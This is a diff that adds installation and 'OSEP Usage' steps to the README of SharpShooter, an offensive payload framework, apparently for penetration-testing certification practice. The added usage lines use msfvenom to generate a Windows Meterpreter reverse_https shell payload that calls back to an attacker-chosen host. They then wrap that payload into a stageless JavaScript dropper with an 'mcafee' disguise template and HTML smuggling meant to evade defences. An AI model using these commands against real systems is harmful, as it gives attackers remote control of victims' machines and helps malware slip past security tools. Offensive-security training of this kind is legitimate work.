@@ -7,6 +7,20 @@
                      /_/                                            
 
 ```
+Installation
+===========
+1. ``git clone https://github.com/l4rm4nd/SharpShooter``
+
+2. ``cd SharpShooter && pipenv --python 2.7 install jsmin)``
+
+3. ``pipenv shell``
+
+OSEP Usage
+===========
+
+1. ``sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f raw -o /var/www/html/shell.txt``
+
+2. ``python2.7 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test --template mcafee --smuggle``
 
 Description
 ===========
